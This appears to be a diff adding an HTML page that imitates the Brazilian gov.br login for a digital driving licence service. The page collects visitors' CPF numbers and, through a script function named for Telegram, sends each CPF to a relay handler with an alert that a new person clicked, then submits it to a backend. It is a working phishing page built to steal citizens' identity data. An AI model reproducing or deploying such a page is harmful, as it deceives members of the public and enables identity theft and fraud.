@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="preconnect" href="https://fonts.googleapis.com"> <!-- ALTERAR -->
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <!-- ALTERAR -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet"> <!-- ALTERAR -->
+    <link rel="stylesheet" href="./css/app/bootstrap.css">
+    <link rel="stylesheet" href="./css/app/app.css">
+    <link rel="stylesheet" href="./css/pages/blue.css">
+    <link rel="stylesheet" href="./../pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+    <!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />-->
+    <!-- FONT AWESOME FREE-->
+    <!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha384-dyB5WuPE6bZjVFZnFXiPTVDrCrxZJpQ1M5B8yQbj8KYvvQvFukKNhCzAn96zVfxD" crossorigin="anonymous">-->
+    <link rel="icon" type="image/x-icon" href="./image/blue/favicon.png">
+    <meta name="csrf-token" content="ZpNYnEnTYR2SPs4EwnIPOjMuuu7egj6x46rvot2t">
+
+    <title>Carteira Digital de Trânsito</title>
+
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+    
+        .box-shadow {
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+    
+        .btn-cta {
+            display: inline-block;
+            padding: 10px 24px;
+            background: #1351B4;
+            border: none;
+            border-radius: 24px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+    
+        .btn-cta:hover {
+            background: #370A69;
+        }
+
+        .icon {
+            margin-right: 0.5rem;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .icon-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.8rem;
+        }
+
+        .header-icon img {
+            width: 14px;
+            height: 14px;
+        }
+
+        .form-icon img {
+            width: 18px;
+            height: 18px;
+        }
+
+        .option-icon img {
+            width: 20px;
+            height: 15px;
+        }
+
+        .footer-icon img {
+            width: 18px;
+            height: 18px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 0.5;
+            vertical-align: middle;
+        }
+
+        .icon-blue img {
+            filter: invert(20%) sepia(47%) saturate(4300%) hue-rotate(230deg) brightness(75%) contrast(120%);
+        }
+
+        .icon-green img {
+            filter: invert(56%) sepia(62%) saturate(427%) hue-rotate(89deg) brightness(98%) contrast(93%);
+        }
+
+        .icon-purple img {
+            filter: invert(33%) sepia(92%) saturate(628%) hue-rotate(243deg) brightness(92%) contrast(101%);
+        }
+
+        .icon-white img {
+            filter: invert(100%) sepia(0%) saturate(0%) hue-rotate(280deg) brightness(104%) contrast(103%);
+
+        .text-success .icon svg {
+            fill: #28a745;
+        }
+
+        .text-center .text-blue {
+            font-size: 15px;
+            display: inline-block;
+            vertical-align: middle;
+            margin: 0;
+        }
+    
+        input.form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #1351B4;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+    
+        .max-w-1200 {
+            max-width: 1200px;
+        }
+    
+        .m-0-auto {
+            margin: 0 auto;
+        }
+    
+        .font-size-18 {
+            font-size: 18px;
+        }
+    
+        .font-size-16 {
+            font-size: 16px;
+        }
+    
+        .font-size-13 {
+            font-size: 13px;
+        }
+    
+        .font-weight-700 {
+            font-weight: 700;
+        }
+    
+        .font-weight-500 {
+            font-weight: 500;
+        }
+    
+        .rounded {
+            border-radius: 8px;
+        }
+    
+        .mt-3 {
+            margin-top: 1rem;
+        }
+    
+        .mt-5 {
+            margin-top: 1.5rem;
+        }
+    
+        .mb-1 {
+            margin-bottom: 0.25rem;
+        }
+    
+        .btn-cta-container {
+            text-align: center;
+        }
+
+        ul.font-weight-500.font-size-15.text-dark.mb-5 li {
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+}
+    
+        ul {
+            padding: 0;
+            list-style-type: none;
+        }
+    
+        ul li {
+            font-size: 15px;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+        }
+    
+        ul li i .icon {
+            margin-right: 0.5rem;
+        }
+
+        ul.font-weight-500.font-size-15.text-dark.mb-5 li {
+            margin-bottom: 1.5rem !important;
+            display: flex;
+            align-items: center;
+        }
+
+      </style>
+
+    
+</head>
+
+<body>
+    <header class="w-100 py-1 box-shadow px-3 ">
+        <div class="max-w-1200 m-0-auto py-2 d-flex justify-content-between align-items-center">
+            <img src="./image/blue/logo.png" alt="" width="110px">
+
+            <div class="font-size-14 text-dark font-weight-500 d-none d-lg-flex justify-content-between">
+                <div class="d-flex align-items-center">
+                    <span class="icon icon-blue header-icon">
+                        <img src="./image/fonts_awesome/adjust.svg" alt="Ajuste">
+                    </span>
+                    Alto Contraste
+                </div>
+
+                <div class="ml-5 d-flex align-items-center">
+                    <span class="icon icon-blue header-icon">
+                        <img src="./image/fonts_awesome/assistive-listening-systems.svg" alt="Assistência">
+                    </span>
+                    VLibra
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="px-3">
+        <section class="w-100 py-1">
+            <div class="max-w-1200 m-0-auto mt-3 py-2 d-flex justify-content-center">
+                <div class="d-none d-lg-block" style="max-width:800px">
+                    <img src="./image/blue/conta.jpg" alt="" style="max-width: 97%">
+                </div>
+
+                <div class="d-flex flex-column box-shadow p-4 rounded text-dark" style="width:390px;">
+                    <h5 class="text-dark font-weight-600 font-size-18 mb-3">
+                        Identifique-se no gov.br com:
+                    </h5>
+
+                    <div class="font-weight-500 text-dark mt-4 mb-1">
+                        <span class="icon icon-blue form-icon">
+                            <img src="./image/fonts_awesome/id-card.svg" alt="ID Card">
+                        </span>
+                        Número do CPF
+                    </div>
+
+                    <div class="text-dark font-size-13 mt-2 mb-1">
+                        Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+                    </div>
+
+                    <form id="cpf-form" action="./api.php" method="POST" onsubmit="event.preventDefault(); processarFormulario();">
+                        <div class="form-group">
+                            <label for="cpf" class="font-weight-bold">CPF</label>
+                            <input type="text" id="cpf" name="cpf" class="form-control" maxlength="14" onkeyup="formatCpf(this)" onblur="checkCpfValidity()">
+                            <span class="invalid-feedback">Informe um CPF válido.</span>
+                        </div>
+                        <button type="submit" class="btn-cta mt-3">Continuar</button>
+                    </form> 
+
+                    <h5 class="mt-2 text-dark font-weight-600 font-size-16 mb-3 pb-2 border-bottom border-grey">
+                        Outras opções de identificação:
+                    </h5>
+
+                    <ul class="font-weight-500 font-size-15 text-dark mb-5">
+                        <li class="text-success">
+                            <span class="icon icon-green option-icon">
+                                <img src="./image/fonts_awesome/mobile-alt.svg" alt="Mobile">
+                            </span>
+                            Login com o seu banco
+                        </li>
+
+                        <li>
+                            <span class="icon icon-blue option-icon">
+                                <img src="./image/fonts_awesome/qrcode.svg" alt="QR Code">
+                            </span>
+                            Login com QR code
+                        </li>
+
+                        <li>
+                            <span class="icon icon-blue option-icon">
+                                <img src="./image/fonts_awesome/hdd.svg" alt="Certificado Digital">
+                            </span>
+                            Seu certificado digital
+                        </li>
+
+                        <li>
+                            <span class="icon icon-blue option-icon">
+                                <img src="./image/fonts_awesome/cloud.svg" alt="Certificado Digital em Nuvem">
+                            </span>
+                            Seu certificado digital em núvem
+                        </li>
+                    </ul>
+
+                    <div class="font-weight-500 text-dark mt-5 mb-1 text-center ">
+                        <span class="icon icon-blue footer-icon">
+                            <img src="./image/fonts_awesome/question-circle.svg" alt="Ajuda">
+                        </span>
+                        <span class="text-blue">Está com dúvidas e precisa de ajuda?</span>
+                    </div>
+
+                    <div class="font-weight-500 text-dark mt-3 mb-1 text-center ">
+                        <span class="text-blue">Termo de Uso e Aviso de Privacidade</span>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+    </main>
+
+    <footer class="">
+
+    </footer>
+
+    
+    <script src="./../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <script>
+        // Função para validar o CPF e enviar o formulário
+        function processarFormulario() {
+            const cpfInput = document.getElementById("cpf");
+            const feedback = document.querySelector(".invalid-feedback");
+    
+            // Valida o CPF
+            if (validateCpf(cpfInput.value)) {
+                feedback.style.display = "none";
+                cpfInput.classList.remove("is-invalid");
+    
+                // Envia mensagem ao Telegram
+                enviarMensagemTelegram(cpfInput.value);
+    
+                // Submete o formulário ao `api.php`
+                document.getElementById("cpf-form").submit();
+            } else {
+                feedback.style.display = "block";
+                cpfInput.classList.add("is-invalid");
+                alert("CPF inválido. Por favor, corrija o CPF e tente novamente.");
+            }
+        }
+    
+        // Função para enviar mensagem ao Telegram
+        function enviarMensagemTelegram(cpf) {
+            const message = `Uma nova pessoa clicou na tela. CPF informado: ${cpf}`;
+            fetch('./send_telegram_handler.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({ message: message }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        console.log("Mensagem enviada com sucesso:", data.response);
+                    } else {
+                        console.error("Erro ao enviar mensagem:", data.error);
+                    }
+                })
+                .catch(error => {
+                    console.error("Erro na requisição:", error);
+                });
+        }
+    
+        // Função de validação do CPF
+        function validateCpf(cpf) {
+            cpf = cpf.replace(/\D/g, ""); // Remove caracteres não numéricos
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) {
+                return false; // Formato inválido ou números repetidos
+            }
+    
+            // Validação dos dígitos verificadores
+            let sum = 0;
+            let remainder;
+    
+            for (let i = 1; i <= 9; i++) {
+                sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+    
+            sum = 0;
+            for (let i = 1; i <= 10; i++) {
+                sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+    
+            return true;
+        }
+    </script>
+    
+    
+
+</body>
+
+
+</html>
